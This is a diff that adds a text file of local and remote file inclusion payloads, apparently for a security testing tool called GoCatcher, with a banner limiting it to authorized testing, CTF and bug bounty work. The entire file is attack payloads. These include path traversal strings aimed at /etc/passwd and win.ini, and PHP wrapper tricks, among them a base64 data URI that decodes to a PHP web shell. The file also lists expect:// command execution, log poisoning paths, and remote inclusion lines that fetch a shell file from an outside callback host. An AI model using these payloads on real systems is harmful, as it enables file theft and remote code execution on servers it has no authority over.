@@ -1,0 +1,27 @@
+===========================================================================
+ GoCatcher :: LFI / RFI test payloads  (text/plain)
+ FOR AUTHORIZED TESTING / CTF / BUG BOUNTY ONLY.
+ Callback host is templated: {{callback_url}}
+===========================================================================
+
+# Local File Inclusion — path traversal:
+../../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+/etc/passwd%00
+..\..\..\windows\win.ini
+
+# PHP wrappers:
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
+expect://id
+
+# Log poisoning / proc:
+/proc/self/environ
+/var/log/apache2/access.log
+
+# Remote File Inclusion (confirm fetch on GoCatcher):
+{{callback_url}}/rfi?src=TARGET
+http://{{host}}/rfi-shell.txt
